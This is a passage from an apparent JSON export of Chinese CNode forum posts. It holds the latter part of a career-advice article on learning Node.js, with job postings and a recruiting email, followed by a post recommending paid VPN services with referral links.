已成为开源包管理了领域最好的生态，直接到2017年10月份，有模块超过47万，每周下载量超过32亿次，每个月有超过700万开发者使用npm。现在早已经超过60万个模块了。</p>\n<p>这里就不一一举例了，给出一个<strong>迷茫时学习Node.js最好的方法</strong>吧！</p>\n<p>某天，我在3w咖啡整理书稿，然后小弟梁过来了，聊聊他的现状，一副很不好的样子，在天津我曾带过他大半年，总不能不管，我给他的建议是：“每天看10个npm模块”</p>\n<p>对于学习Node.js迷茫的人来说，这是最好的方式，当你不知道如何做的时候，就要向前（钱）看，你要知道积累哪些技能对以后有好处。对于学习Node.js必经之路，一定是要掌握很多模块用法，并从中汲取技巧、思路、设计思想的。与其不知道学什么，为什么不每天积累几个技巧呢？</p>\n<p>推荐一个repo即 <a href=\"https://github.com/parro-it/awesome-micro-npm-packages\">https://github.com/parro-it/awesome-micro-npm-packages</a> 小型库集合，一天看十个不是梦！</p>\n<p>更多讨论 <a href=\"https://zhuanlan.zhihu.com/p/29625882\">https://zhuanlan.zhihu.com/p/29625882</a></p>\n<h3>非科班出身如何Node.js</h3>\n<p>有朋友提问</p>\n<pre class=\"prettyprint\"><code>狼叔，关注你和cnode很久了，最近有点迷茫，想请你指点下。\n我的情况是这样的，非科班出身，从事前端工作4年，公司使用的技术栈是vue2、vue-router、vuex、webpack，目前的能力处理工作还是比较轻松，但是也很明确自己有很多不足，只是对于如何提升比较迷茫。\n不足：\n1、非科班出身，计算机基础薄弱\n2、对当前使用的技术了解不够深入，很多东西只停留在会用的层面\n3、对服务端了解较少，想学node，却不知道如何系统的学习\n</code></pre><p>解答困惑：</p>\n<p>1、计算机基础薄弱该如何完善自己的知识体系？</p>\n<p>答:追逐长尾，所见所闻不懂的都去学就好啦。我是这样过来的，头几年每天14个小时+，很累，不过效果还可以。os，算法，数据结构，设计模式，编译原理，基本也就这些重点。做到每天都有进步就好，别贪多求快。数学和英文当然也是越狠越好的！</p>\n<p>2、如何在技术上做更深入的探索？</p>\n<p>答:技术人只关注技术，想法创意通常比较少。最简单的办法就是抓自己的痒，比我大学时和朋友们翻译过grails文档，所以对翻译有情节。为了翻译，我用node写了无数工具尝试，反复对比各种翻译工具，理解它们背后的设计。包括markdown里嵌html标签标识中英文，然后gulp编译成独立文档。甚至一度想上线卖服务。这种折腾真的很爽，甚至耽误了不少翻译。有时要警惕长尾，不要忘了自己的初衷</p>\n<p>3、如何系统的学习node？</p>\n<p>答:阶段</p>\n<p>1/要会用，能完成工作任务\n2/写点提高效率的工具\n3/参与开源项目，甚至是node源码</p>\n<p>应对方法</p>\n<p>1/《node in action》看五遍，然后就去写吧，别管代码质量如何，能写敢写\n2/多用些模块，理解它们，如果有机会就自己写一下，万一有很多人用你，我小弟写过一个地区选择加载的json数据，star数不少呢\n3/给别人贡献代码，要去学别人的习惯，网上有git标准工作流和提pr方法，你要做的是精研该模块代码，关注issue，其他就是等机会。另外朴灵的深入浅出多读几遍，试着读node源码，你的理解会更好。推荐看看我写的《通过开源项目去学习》<a href=\"https://github.com/i5ting/Study-For-StuQ\">https://github.com/i5ting/Study-For-StuQ</a>\n4/跳出node范围，重新审视node的应用场景，对未来你的技术选项和决策大有裨益</p>\n<ul>\n<li>2.1 Node 用途那么多，我该从哪里学起？</li>\n</ul>\n<p>答：如果有机会就直接上Web应用，如果没有机会就从前端构建，工具等方面开始做，慢慢引入更潮更酷的前端技术，自然就把Node引入进来了。不要急。</p>\n<ul>\n<li>2.2 Node Web 框架那么多，我该怎么选？</li>\n</ul>\n<p>答：初学者推荐Express，如果有一定经验，推荐Koa。当然真正项目里还是推荐Eggjs和Thinkjs这样的框架。</p>\n<ul>\n<li>2.3 关于 Node 的书几乎都过时了，我该买哪本？</li>\n</ul>\n<p>答：\n1）Node in action和了不起的Node.js是入门的绝好书籍，非常简单，各个部分都讲了，但不深入，看了之后，基本就能用起来了\n2）当你用了一段之后，你会对Node.js的运行机制好奇，为啥呢？这时候去读朴大的《深入浅出Node.js》一书就能够解惑。原因很简单，九浅一深一书是偏向底层实现原理的书，从操作系统，并发原理，node源码层层解读。如果是新手读，难免会比较郁闷。\n3)实践类的可以看看雷宗民（老雷）和赵坤（nswbmw）写的书</p>\n<p>如果你不着急，也可以等我的那本《更了不起的Node.js》，时间待定。</p>\n<h2>Part 3延伸：大前端变化那么快，如何才能做到每日精进？</h2>\n<p>有朋友问现在Android开发和web前端开发哪个前景更好？我的回答是明显是前端更好，看一下移动端发展过程</p>\n<blockquote>\n<p>native &lt; hybrid &lt; rn/weex &lt; h5</p>\n</blockquote>\n<p>目前rn和weex的开发逐渐变得主流，组件化写法已经由前端主导了。以前ios和android程序员占比很高，但现在就留1到2个写插件，真是差别很大。</p>\n<p>Web开发对移动端的冲击非常大。当然现在Web技术也开发PC client了，比如vscode是通过electron打包的，效果还是相当不错的。</p>\n<p>前端可以说是最近几年开发里最火的部分，原因很多，最主要是开发方式的变更，以今时今日的眼光来看，称之为现代Web开发是不为过的。</p>\n<p>先给出现代Web开发的概览图</p>\n<p><img src=\"//static.cnodejs.org/Fq7XArZKEXlzHEwBiR35IxHs4nOg\" alt=\"15117552681353.jpg\"></p>\n<p>每次演讲我会都问大家是不是前端，回答“是”的人非常多，我会开玩笑的恭喜大家：“现在的前端就是钱端”，确实，现在前端发展异常的快，而且没有趋向于类比java里ssh框架的那种稳定，所以未来很长一段时间，还会增长，持续混乱，这对前端来说是把双刃剑，一方面有很强的压迫感，不学习就跟不上时代，另一方它也是机遇，能够带给更多机会，包括money。</p>\n<p>大家都疑惑的一个问题是如何在这样巨变的时代能够通过学习来应变，我可以很负责的告诉大家，没有捷径，但通过掌握 Node.js 能够让你降低这个学习曲线而已，毕竟Node.js是大前端的基础设施。大家可以看一下，前端的开发过程，模块化，构建，辅助工具，调优，架构调整，可以说Node.js是无处不在的。</p>\n<p>其实，辅助大前端开发只是Node.js的一个非常无心插柳的衍生功能，通过掌握Node.js能够让你能做的更多、获得的更多，甚至可以说有更多自我实现的快乐，这也是我那本书书名字里“更了不起的”要去阐述的内容。</p>\n<p>综上种种，就是我一直提倡以 JavaScript 语言为中心的 <code>Node全栈</code> 概念的缘由，JavaScript 覆盖所有前端，Node.js 擅长做 I/O 密集型的后端，外加辅助开发的各种基础设施，无疑是工作、学习和成为快速掌握全栈技术最好的途径。你会的越多，你能做的就更多，你的人生也将会有不一样的精彩篇章。</p>\n<p>全栈核心</p>\n<ul>\n<li>后端不会的 UI（界面相关）</li>\n<li>前端不会的 DB（业务相关）</li>\n</ul>\n<p>只要打通这2个要点，其他就比较容易了。最怕的是哪样都接触点，然后就号称自己是全栈，建议大家不要这样做，这就好比在简历里写精通一样，基本上都会被问到尴尬。全栈是一种信仰，不是拿来吹牛逼的，而可以解决更多问题，让自己的知识体系不留空白，享受自我实现的极致快乐。</p>\n<h3>我的全栈之路</h3>\n<p>想问一下狼叔最近的业务一直都是简单的用express搭一个后端服务，没有其他更加深入node的业务了，这种时候应该如何自己给自己创应用场景呢</p>\n<blockquote>\n<p>没有目标就向钱看，有目标就向前看</p>\n</blockquote>\n<ul>\n<li>从 java 开始，蹭课，背着机箱到深圳，3个月胖20斤</li>\n<li>坚持翻译英文文档，看 《Thinking in Java》</li>\n<li>毕业后开始 bi，整理 bi 文档</li>\n<li>学长明林清，传授 jQuery，愿意学，别人就更愿意分析</li>\n<li>接手《内蒙广电数据分析与科学决策系统》，打通前、后端</li>\n<li>广东联通，自己造轮子，写 jQuery 插件，DRY</li>\n<li>做云计算，学习 AIX，写有《凌云志》</li>\n<li>分手、离职，去做 iOS，从 cordova 开始搞 H5，研究各种移动端框架，自己写框架，转原生</li>\n<li>面试也是学习的利器，轻松进新浪</li>\n<li>总结了大量 iOS 经验，想写书，结果写了一堆写书的工具</li>\n</ul>\n<blockquote>\n<p>既然无法逃避，就热爱它，最后变成兴趣</p>\n</blockquote>\n<ul>\n<li>去网秦做技术总监，做首席，管架构，带人，写开源项目</li>\n<li>创业，当 CTO，结婚，做公众号运营，写书，最苦的时候没钱吃饭，又不能找媳妇要，只能在 StuQ 上讲点课</li>\n<li>加入去哪儿网，任职前端架构师</li>\n<li>加入阿里巴巴，前端技术专家</li>\n</ul>\n<blockquote>\n<p>人生不只有代码，但它能让我快乐，终生受益</p>\n</blockquote>\n<p>也曾懵懂，也曾迷茫，但我这人比较傻，一直信奉：“一次只做1件事儿，尽力做到极致”，短时间看这是比较傻的，但一旦你坚持下去，你就会发现技术其实是门手艺，厚积薄发。</p>\n<p>我没办法说自己最擅长什么，但在什么场景下用什么技术是我擅长的。或者说，应变是我最大的本事。很多框架，新技术我都没见过，用过，但花一点点过一下，就能拿已有的知识快速的理解它，这其实是长期学习的好处。</p>\n<p>现在越来越忙，写代码的时间越来越少，技术又越发展越快，我能做好的就是每日精进，仗着这点已有的知识储备跟年轻人比赛。我不觉得累，相反我很享受这种感觉，没有被时代淘汰，是一件多么幸福的事儿。</p>\n<h3>从后端转</h3>\n<p>做后端的人</p>\n<ul>\n<li>对数据库是比较熟悉，无论 mongodb，还是 mysql、postgres</li>\n<li>对前端理解比较弱，会基本的 html，css，模板引擎等比较熟悉</li>\n</ul>\n<blockquote>\n<p>4阶段循序渐进，build 与工具齐飞</p>\n</blockquote>\n<p>前端开发4阶段，我的感觉是按照顺序，循序渐进就好。</p>\n<h3>从前端转</h3>\n<p>从前端往后端转，api 接口非常容易学会，像 express、koa 这类框架大部分人一周就能学会，最难的是对 db、er 模型的理解，说直白点，还是业务需求落地的理解</p>\n<p>我们来想想一般的前端有什么技能？</p>\n<ul>\n<li>html</li>\n<li>css（兼容浏览器）</li>\n<li>js 会点（可能更多的是会点 jquery）</li>\n<li>ps 切图</li>\n<li>firebug 和 chrome debuger 会的人都不太多</li>\n<li>用过几个框架，大部分人是仅仅会用</li>\n<li>英语一般</li>\n<li>svn/git 会一点</li>\n</ul>\n<p>那么他们如果想在前端领域做的更深有哪些难点呢？</p>\n<ul>\n<li>基础：oo，dp，命令，shell，构建等</li>\n<li>编程思想上的理解（mvc、ioc，规约等）</li>\n<li>区分概念</li>\n<li>外围验收，如 H5 和 hybird 等</li>\n<li>追赶趋势，如何学习新东西</li>\n</ul>\n<p>以上皆是痛点，所以比较好的办法应该是这样的。</p>\n<ul>\n<li>玩转 npm、gulp 这样的前端工具类（此时还是前端）</li>\n<li>使用 node 做前后端分离（此时还是前端）</li>\n<li>express、koa 这类框架</li>\n<li>jade、ejs 等模板引擎</li>\n<li>nginx</li>\n<li>玩转【后端】异步流程处理（promise/es6的(generator|yield)/es7(async|await)）</li>\n<li>玩转【后端】mongodb、mysql 对应的 Node 模块</li>\n</ul>\n<p>从我们的经验看，这样是比较靠谱的。先做最简单前后端分离，里面没有任何和db相关，前端可以非常容易的学会，基本2周就已经非常熟练了。一般半年后，让他们接触【异步流程处理】和【数据库】相关内容，学习后端代码，就可以全栈了。</p>\n<h3>从移动端转</h3>\n<p>看一下移动端发展过程</p>\n<blockquote>\n<p>native &lt; hybrid &lt; rn/weex &lt; h5</p>\n</blockquote>\n<p>目前rn和weex的开发逐渐变得主流，组件化写法已经由前端主导了。以前ios和android程序员占比很高，但现在就留1到2个写插件，真是差别很大。狼叔一直固执的以为未来是h5的。</p>\n<p>现在的 Native 开发是姥姥不疼舅舅不爱，非常尴尬，很明显连培训出的人就业不要工资混经验就很明显了。另外领导们也都在惦记，能不能用 H5 写？这还算是保守的，如果直接激进的就直接上 RN 了，那么 Native开发的程序员就变了</p>\n<blockquote>\n<p>一个写插件的程序员…招谁惹谁了。。。。</p>\n</blockquote>\n<p>要么忍，要么转，没办法，认命吧，温水里舒服了几年，也该学点东西了</p>\n<ul>\n<li>hybrid 或组件化开发，你总要会一样</li>\n<li>无论哪种，你都离前端很近，因为 H5 或组件化都是从前端走出来的</li>\n<li>组件化在前端领域先行，无论借鉴还是学习都不可避免</li>\n<li>如果没时间就直接上组件化，如果有时间就好好学学前端完整体系，最终也还是要学组件化</li>\n</ul>\n<p>原生开发就是 iOS 用 OC/Swift,Android 用 java 或 scala 等，就算偶尔嵌入 webview，能玩js的机会也非常好少</p>\n<p>所以移动端转全栈的方法，最好是从 cordova（以前叫 phonegap）开始做 hybrid 开发。</p>\n<ul>\n<li>只要关注 www 目录里的 H5 即可，比较简单</li>\n<li>如果 H5 不足以完成的情况下，可以编写 cordova 插件，即通过插件让 js 调用原生 sdk 里功能</li>\n<li>cordova 的 cli 可以通过 npm 安装，学习 npm 的好方法</li>\n<li>学习 gulp 构建工具</li>\n</ul>\n<p>只要入了 H5 的坑，其实就非常好办了。</p>\n<ul>\n<li>然后 h5、zeptojs、iscroll、fastclick 等</li>\n<li>然后微信常用的，如 weui、vux（vue+weui）、jmui（react+weui）</li>\n<li>然后可以玩点框架，比如 jquery mobile，sencha touch</li>\n<li>然后可以玩点高级货，ionicframework（基于 angularjs、cordova）</li>\n<li>然后前端4阶段，依次打怪升级</li>\n<li>然后 node</li>\n</ul>\n<p>这个基本上是我走的路，从2010年写iOS、做phonegap（当时是0.9.3）、一路走到现在的总结吧！</p>\n<p>以前技术发展还不是那么明显，写 Java 的时候 <code>Apache</code> 的开源用的比较多，那时开源的代码托管<code>sourceforge</code>，<code>google code</code> 也都凑合用，自从 <code>Git</code> 和 <code>GitHub</code> 出现时候，代码社交兴起，极大的促进了开源的活跃，使得大量明星项目脱引而出。这是好事，如果没有开源，中国的软件水平真是要落后好多年。那么问题也来了，如何能够在技术快速发展的今天，个人成长也能更好呢？</p>\n<p>学习的3种层次，跟人学最快，其次是跟书（或者博客）学，最差的是自悟。但是牛人不能遇到，遇到了也未必有精力教你，书本或者博客，别人有，但不一定写出来，就算是写了，可能只是点到为止。至于自悟，如果没有深厚的积累的，还是有相当大难度的。</p>\n<p>对于开发来说代码是一切基础，在掌握了一定计算机基础后，其差别就在于代码质量和眼界。编程没有捷径，能够做到每日精进就是极好的。现在开源代码非常多，要能够从中获取自己所需的知识，也是一种本领！如果能够坚持着每日精进，根本不需要向其他人学习的。</p>\n<p><img src=\"//static.cnodejs.org/FvXJwylBhEv33TowEJYMfX-CULZC\" alt=\"15011322589471.jpg\"></p>\n<p>大家可以在 Github 随便打开一个前端项目，里面有一半以上都是 Node.js 相关信息，各种包管理、测试、ci、辅助模块，如果大家对这些基础信息掌握的非常好，那么学习一个新的框架，你要比别人快好多，最重要的是学了一次，到处使用。</p>\n<p>很多人问我怎么才能成为一个 Node.js 大神？我的回答是“在cnode论坛上坚持写文章和开源项目2年，足矣，轻松进阿里腾讯，不用你找他们，他们自会找你的”。</p>\n<blockquote>\n<p>从今天起，开始重视开源项目，重视 node，做到每日精进</p>\n</blockquote>\n<h2>Part 4实践：从招聘角度来看， Node.js 开发需要具备哪些技能？</h2>\n<h3>招人标准</h3>\n<p>先说下我的招人标准，做技术总监时上指下派只要看好技术能力和态度即可，做CTO时要考虑团队文化，人品和能否在公司长留，所以不同的人面试要看的点是不一样的，我曾面过很多Node.js程序员，也见过很多面试题，汇总一下，大致有以下9个点：</p>\n<ol>\n<li>基本的Node.js几个特性，比如事件驱动、非阻塞I/O、Stream等</li>\n<li>异步流程控制相关，Promise是必问的</li>\n<li>掌握1种以上Web框架，比如Express、Koa、Thinkjs、Restfy、Hapi等，会问遇到过哪些问题、以及前端优化等常识</li>\n<li>数据库相关，尤其是SQL、缓存、Mongodb等</li>\n<li>对于常见Node.js模块、工具的使用，观察一个人是否爱学习、折腾</li>\n<li>是否熟悉linux，是否独立部署过服务器，有+分</li>\n<li>js语法和es6、es7，延伸CoffeeScript、TypeScript等，看看你是否关注新技术，有+分</li>\n<li>对前端是否了解，有+分</li>\n<li>是否参与过或写过开源项目，技术博客、有+分</li>\n</ol>\n<p>补充一句:只看技能没人品的人，千万别招，白脸狼</p>\n<p>主动执行，辅助团队\n掌握一门后端语言；熟悉用户体验相关知识；了解软件工程。\n精通浏览器工作原理，熟悉HTTP协议，熟悉设计模式。\n掌握改善无障碍访问的方法；掌握数据采集分析能力；熟悉可维护性问题。\n通过开发、使用、推广效率工具让自己与团队的效率得到提高；\n提炼可复用组件，为类库贡献高质量代码.\n积极完善知识库；\n跨团队分享技术和专业相关知识。\n辅导新人技能成长；\n协助主管做招聘和团队管理工作。</p>\n<h3>大家是选大公司还是小公司？</h3>\n<p>我再知乎上回复的《在跳槽后的第三个月，收到世界500强的offer，我该怎么办？》</p>\n<p>1）互联网公司优先，流量大，人才多，机会也多，流程规范一些</p>\n<p>2）今天的世界500强不比从前了，普华永道应该是四大之一，不知道信息化怎么样，你只要和你现在的公司对比就好了。</p>\n<p>3）问问自己想要什么，钱，经历，还是时间</p>\n<p>如果你很年轻，现在很安逸，我建议你换。如果不是很想动，那就学会所有能接触到的知识再换。</p>\n<p>我是降薪来的阿里，原因有三，一是有事可为，老板重用你给你机会，二是集团内部是open的，偏偏我知识面足够可以看出它们的好处，算是另一种补偿吧，三是对个人品牌是一个升级，狼叔的职业生涯到此已经足够了，进可攻退可守，也算另一种自由吧！</p>\n<p>钱多是个优势而已，还有氛围，文化，信仰</p>\n<ul>\n<li>牛人多</li>\n<li>业务需要</li>\n<li>成熟后有更多精力</li>\n<li>内部竞争，优胜劣汰</li>\n<li>财务相对自由，可以追求信仰了</li>\n</ul>\n<p>前几天还和 @苏千 聊，我和 @死月絲卡蕾特 相继入职阿里，还有cnode社区著名程序员也即将入职阿里，当时大家开玩笑说:</p>\n<blockquote>\n<p>“前端的终极归宿是阿里，不是在阿里，就是在去阿里的路上”</p>\n</blockquote>\n<p>另外要说的一点是pc和h5站在使用Node.js做api中间层，其最佳实践已成型，量也是极大的。以前前端玩得还是比较弱，如果能够缓存+控制页面数据，获得一个性能极大的提升也是极好的。2018年，争取拿这个做主题演讲上qcon或archsummit大会。</p>\n<p>每天忙得很开心，这就是我现在状态。其实，我的折腾还是在于想做些事情。如果你也想跟我一起做事，请将简历邮件给我 <a href=\"mailto:langshu.ssl@alibaba-inc.com\">langshu.ssl@alibaba-inc.com</a>，团队大量招人，也可以帮忙推荐给集团其他部门。</p>\n<p>大公司的做事方式</p>\n<ul>\n<li>按照规矩做事，不要碰红线</li>\n<li>工时一般压的都不会太紧，都是可以商量的，但态度一定要好</li>\n<li>闲的时候自己学点东西，上班要学习相关，下班学不相干的。别犯傻。</li>\n<li>多创造点额外价值，让你的领导更喜欢你</li>\n<li>理解能力要强，不要让你的领导说二遍。</li>\n</ul>\n<p>小公司</p>\n<ul>\n<li>简单粗暴，快速出东西，领导最关心的是进度</li>\n<li>执行力要强，遇佛杀佛，有鬼杀鬼</li>\n<li>代码质量其实没太多人管，但自己要注意养成好习惯</li>\n<li>没有机会自己创造机会。创造机会之前是赢得信任。</li>\n</ul>\n<p>狼叔经常说的一句：“少抱怨，多思考，未来更美好”，大部分人都喜欢积极的人，遇到问题不怕不躲不避，要相信自己能够解决，最多是时间问题。</p>\n<p>还有一句是：“没目标向钱看，有目标向前看”。历史上很多这样的例子，在2010年左右iOS开发刚起步，会拖拽弄个界面的就五位数工资，比做JAVA的几年的都要多。这世界就是这样不公平。但是你也不能不思进取，这样也是极其危险。在2016年左右，其实iOS开发就遇到了市场饱和的问题，很多培训出来的人都找不到工作，各家公司都在考虑换react-native或weex或者h5。</p>\n<p>所以，当你有机会进入一个很有前途的方向，你要努力学好，并准备好下一个阶段的应变。相反，如果当成找一个养老的地方，早晚会遇到尴尬的。比如现在很多iOS程序员被迫去学react/vue等，境遇也不太好的，更有甚者直接被开除。</p>\n<h3>优酷-高级前端开发</h3>\n<p>职位描述</p>\n<ol>\n<li>支撑企业级应用后台开发，使用 React 等前端框架搭建后台页面，实现交互需求及后端服务对接;</li>\n<li>以模块化的思想设计开发通用前端组件，并能够针对OTT,移动端进行针对性优化；</li>\n<li>在理解前端开发流程的基础上，结合前端实际建立或优化提升工作效率的工具；</li>\n<li>在理解产品业务的基础上，提升产品的用户体验，技术驱动业务的发展；</li>\n<li>关注前端前沿技术研究，通过新技术服务团队和业务；</li>\n<li>使用 Weex 技术开发产品需求。&quot;</li>\n</ol>\n<p>职位要求</p>\n<ol>\n<li>精通前端技术，包括HTML/CSS/JavaScript/Node.JS等；</li>\n<li>掌握Bootstrap，jQuery，AngularJS，React等框架，并有项目实践；</li>\n<li>熟悉前端模块化、编译和构建工具，如grunt，gulp,webpack等；</li>\n<li>至少熟悉一门非前端的语言（如Java/PHP/C/C++/Python/Ruby）,有项目实践更佳；</li>\n<li>具备跨终端的前端开发能力，在Web（PC+Mobile）/Node.js/Native App三个方向上至少精通一个方向，具备多个的更佳，鼓励在Native和Web技术融合上的探索；</li>\n<li>具有较强的学习能力，对前端技术有持续的热情，个性乐观开朗,逻辑性强，善于和产品，UED，后端等方向同学合作。</li>\n</ol>\n<h3>PixelLab</h3>\n<p>PixelLab是与淘宝GM Lab联合成立的专注于视频算法方向的研发部门，主要涉及视频的空间感知、轨迹跟踪、图像分割、遮挡检测以及照片级渲染等相关技术。用于实现视频内的内容植入与后期特效的研发，属于视频MR的场景，主要应用于广告植入平台的研发，方向靠谱老板人好，欢迎推荐。主要需要的岗位包括了图像算法、3D视觉算法，渲染算法，WebGL以及并行计算等几大方向，因为算法类招聘实在难，所以将JD的链接帖出来希望同事们有适合的人可以内推一下。</p>\n<p>岗位要求：</p>\n<ol>\n<li>本科及以上学历，5年以上工作开发经验；</li>\n<li>扎实的计算几何基础，熟悉常见数学工具；</li>\n<li>熟练WebGL, Canvas渲染开发，熟练Shader编写， 熟悉Three.js, OSG.js者优先;</li>\n<li>熟练运用JavaScript语言与HTML5、CSS3等技术;</li>\n<li>熟悉主流移动浏览器的技术特点，有移动端H5, WebGL项目经验者优先;</li>\n<li>有移动端WebGL开发经验者优先;</li>\n<li>学习能力强、应变能力强，优秀的沟通能力和协调能力，执行能力强，具备较强的团队合作精神。</li>\n</ol>\n<h3>蚂蚁金服</h3>\n<p>岗位要求：</p>\n<ul>\n<li>大学本科学历，2年以上开发经验，能熟练使用常见类库或框架，编写高质量的前端代码；</li>\n<li>熟悉NodeJS，有NodeJS开发经验，熟悉Express\\koa等框架；</li>\n<li>熟练掌握React、Redux及相关框架和技术，有单页面应用开发经验；</li>\n<li>精通ES6，gulp，webpack等规范和技术；</li>\n<li>善于 Web 性能优化与前端效果的实现；</li>\n<li>良好的团队合作精神和积极主动的沟通意识，具有很强的学习能力和对新技术的追求精神，乐于分享；</li>\n<li>有大型网站开发经验者优先。</li>\n</ul>\n<p>我们的前端专业建设方向</p>\n<ul>\n<li>基于ReactJS的主题可配置组件化平台</li>\n<li>基于Nodejs的UED中台业务（浏览器端web页面监控等）</li>\n<li>基于Docker的nodejs云容器平台</li>\n<li>基于Webpack的前端工程化体系建设</li>\n<li>基于eggjs的react同构框架</li>\n<li>基于G2的业务数据可视化组件库</li>\n<li>大规模图形识别/图像处理/AR/VR//语音交互等研究性领域探索</li>\n</ul>\n<h3>联系方式</h3>\n<p>目前北京，杭州，广州，上海，深圳，成都都在招聘，如果你也想跟我一起共事，请将简历邮件给我 <a href=\"mailto:langshu.ssl@alibaba-inc.com\">langshu.ssl@alibaba-inc.com</a>，团队大量招人，也可以帮忙推荐给集团其他部门。</p>\n<p>有机会和winter，勾股，玉伯，苏千，朴灵、死马、偏右，徐飞，阮一峰，天猪，裕波等大神一起工作哦。</p>\n<p>悄悄地说，其实其他公司我也可以帮推荐。</p>\n<h2>结束语</h2>\n<p>年轻时死磕，年长点让小弟死磕，现在抓个专家一起吃饭，没有什么是一顿饭解决不了的，不行就二顿</p>\n<p>工程师的能力不是编码和死磕，而是解决问题</p>\n<ul>\n<li>年轻死磕是为了长本事，30岁以前都可以这样做</li>\n<li>带团队后，要懂得任务下放，让更多人帮你，别带人越多越累</li>\n<li>30岁之后是打牌阶段，技能积累足够用，这时要注重社交，打组合拳才能玩的更好</li>\n</ul>\n<p>强调30岁不是我创造的，大部分人都会认为30岁后事情，压力会明显大得多，比如家庭，孩子，房子，车子，票子，甚至是管理，权利，欲望等等吧。我感受最深的是身体不如从前和记忆力明显下降。</p>\n<p>狼叔说: “少抱怨，多思考，未来更美好”</p>\n<p>大部分人体会不到坚持的乐趣，不会玩，所以抱怨多。其实玩出乐趣也是一种能力，尤其是像写代码这种看似无聊的事儿。最开始可能只想赚点钱，后面变成热爱，这样才美好。只要坚持每日精进开心就好了。</p>\n<p>另外，时间也要好处处理，狼叔总会提菜根谭上的一句话:【闲时要有吃紧的心思，忙里要有偷闲的乐趣】。</p>\n<p>每个人的一生中都有很多坎，类似于瓶颈，唯有苦难和坚持才能冲破，坚持会产生自信，苦难会创造机会。一个经过苦难还有自信的人，一定会有更美好的未来。</p>\n<p>如果大家还有问题，可以去cnode社区发帖at我，也可以在Node全栈公众号提问。</p>\n<h2>Part 5答疑：回答大家的问题</h2>\n<p>答疑有点多，这里就不一一贴出来，如果是新用户和比较迷茫的Node朋友去Live里听吧。</p>\n<ul>\n<li>感谢justjavac大神的<a href=\"https://github.com/justjavac/free-programming-books-zh_CN/#%E7%BD%AE%E9%A1%B6\"> 免费的计算机编程类中文书籍</a> 收录并推荐</li>\n<li><a href=\"https://github.com/i5ting/How-to-learn-node-correctly\">github地址，以后在仓库里更新</a></li>\n<li><a href=\"https://www.zhihu.com/lives/928687583372926976\">Live地址</a></li>\n</ul>\n</div>","title":"【全文】狼叔：如何正确的学习Node.js","last_reply_at":"2019-04-29T12:52:45.476Z","good":true,"top":false,"reply_count":104,"visit_count":59352,"create_at":"2018-03-22T02:35:23.073Z","author":{"loginname":"i5ting","avatar_url":"https://avatars3.githubusercontent.com/u/3118295?v=4&s=120"}},{"id":"5b101b058a4f51e140d9440c","author_id":"5b094f5257137f22415c4685","tab":"ask","content":"<div class=\"markdown-text\"><h1>付费VPN推荐</h1>\n<p>更新：<a href=\"https://www.wallmama.com/best-vpn-china-2019/\">2019年便宜好用的翻墙VPN推荐</a></p>\n<h2>免费VPN服务最好不要用</h2>\n<p>用免费VPN服务，网络流量流经一个不可信的第三方，是件危险的事。你的流量里可能有没有充分加密保护的敏感信息：密码，银行账号，私密资料，访问历史等，流量劫持的潜在风险还不止这些。</p>\n<h2>破解的VPN软件更危险</h2>\n<p>这更危险，此类破解软件挂马带病毒是很常见的事，贪便宜从不明来源下载，很快让你的电脑裸奔；况且，破解软件不能更新，即使能用，也只能用极有限的时间。</p>\n<h2>国内的付费VPN服务想用也用不了</h2>\n<p>去年，GreenVPN被关。</p>\n<p>国内还剩多少可用的付费VPN服务，没统计过，越来越少吧，即使还有也离被关不远了。国内某些小众搜索引擎的结果页里偶尔还出现一些不入流（骗钱）的产品。</p>\n<p>也许存在传说中的“已注册“的服务，但国内政策风险太大，不建议购买。</p>\n<h2>国外的付费VPN服务能用的已经不多</h2>\n<p>绝大多数在这几年也陆续沦陷了，国内无法直接购买，买VPN要先上VPN，本身就很无奈。</p>\n<p>不是所有的付费VPN厂商都重视中国市场，只有一线大厂才可以，小厂商的财力、人力、技术能力都没大到能长期保证国内用户能持续使用服务的程度。</p>\n<h2>国外付费VPN推荐</h2>\n<p>下面推荐的服务商都</p>\n<ul>\n<li>\n<p>重视中国用户，国内还能直接支付宝购买</p>\n</li>\n<li>\n<p>全球服务器，好用的客户端</p>\n</li>\n<li>\n<p>提供额外加强服务，持续改进算法和服务质量</p>\n</li>\n<li>\n<p>支持无条件退款</p>\n</li>\n</ul>\n<p><strong>国内还能用支付宝买到</strong>的国外付费vpn推荐：</p>\n<h2>VPN推荐一：<a href=\"https://indx.cc/exp\">ExpressVPN</a></h2>\n<p>全球148+服务器所在地 / 无限流量 / 多协议，包括openVPN / 一键连接 / 同时3台设备 / 256-bit AES加密 / 支付宝支付 / 支持路由器连接 / 完全IP隐藏 / 零日志 / 全终端覆盖 / 30天无条件退款 / Split tunneling技术 + 浏览器插件，同时访问内外网 / <strong>推荐原因：速度相对最快</strong></p>\n<h2>VPN推荐二：<a href=\"https://indx.cc/vyr\">VyprVPN</a></h2>\n<p>70+自有服务器所在地，200,000+IP地址 / 无限流量 / 多协议，独家混淆协议 / 一键连接 / 同时5台设备 / 支持P2P / 变色龙加密，<strong>推荐原因：连接相对最稳定</strong> / 支付宝支付 / 支持路由器连接 / NAT安全机制 / DNS加密 / 全终端覆盖 / 2年款最大优惠 / 30天无条件退款 / 按程序控制网络技术，同时访问内外网</p>\n<h2>VPN推荐三：<a href=\"https://indx.cc/nrd\">Nord</a></h2>\n<p>3400+服务器 / 无限流量 / 支持Onion over vpn / 一键连接 / 同时6台设备 / 支持P2P / 双重加密 / 支付宝支付 / 支持路由器连接 / CyberSec安全技术 / 零日志 / 专业客户端 / 2年款最大优惠 / 随时退款 / 浏览器代理插件，同时访问内外网 / <strong>推荐原因：随时退款</strong></p>\n<h2>自建VPN方案</h2>\n<p>自建VPN是否成功，得靠运气，像<a href=\"https://www.vultr.com/?ref=6996621\">Vultr</a>这样的IP池比较大，但国内用户也特别多，准备好换IP吧，长远没有付费VPN靠谱。</p>\n<h2>付费VPN稳定性与速度</h2>\n<p>没有100%稳定的VPN服务，每年特殊时间段的连接质量都不好，容易断线。</p>\n<p>一年中大部分时间，日常使用Google，收发Gmail，使用Youtube还是稳定的。</p>\n<p>1080P的油管通常是不可能的，只在极少时间还算流畅，720P多数时候比较流畅。</p>\n<p>日常使用，偶尔断线，基本换服务器位置重连即可。</p>\n<p>即使是同一个服务，在一天不同时段，或在不同地域访问，服务质量也可能天差地别，没人知道具体原因，所以如果你在旅行途中，如果要保证最大限度的可连接性，可以考虑常备两个以上的服务，如果一个服务暂时出问题，另一个替上。</p>\n<h2>用好试用期</h2>\n<p>一线服务商都提供免费试用或至少7天的无条件退款，利用好试用期，充分检测服务质量，不满意及时退款，因为各服务在不同地域服务质量不同，所以一定要自己试一试。</p>\n</div>","title":"